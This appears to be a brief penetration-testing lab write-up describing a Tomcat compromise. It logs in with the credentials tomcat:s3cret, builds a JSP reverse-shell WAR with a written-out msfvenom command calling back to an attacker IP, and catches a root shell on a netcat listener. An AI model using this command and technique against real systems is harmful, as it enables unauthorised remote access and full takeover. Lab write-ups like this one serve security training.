Attack Vector 2

Logged in with tomcat:s3cret

Notice that you can upload war files

Make a shell via msfvenom
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.214 LPORT=5678 war > shell.war`
![64c00824db58592690aab95c0674c72d.png](../../../_resources/e8e1e61a5ea341d2b7a96bcf38441402.png)

Start an nc listener
![9749751d284a19f61b6bc3af4f488ead.png](../../../_resources/3b2dad634fd749bc8507fc2f6a13165c.png)


We have a shell on the nc listener
![ffa471ffa499cfa96693d00b8d4635c9.png](../../../_resources/31244758f5ab4d55bc41f40ef3e867c7.png)

Check who you are... you're root!
![766e10a467708c4800cde1af0ced1688.png](../../../_resources/25966b19703146f8b8925d8c9309e7fb.png)

Get a better shell
![cb3d6ceb98a320408f3d7193aec5cf42.png](../../../_resources/a9f43adc86b44dcaada71de70aed43ae.png)


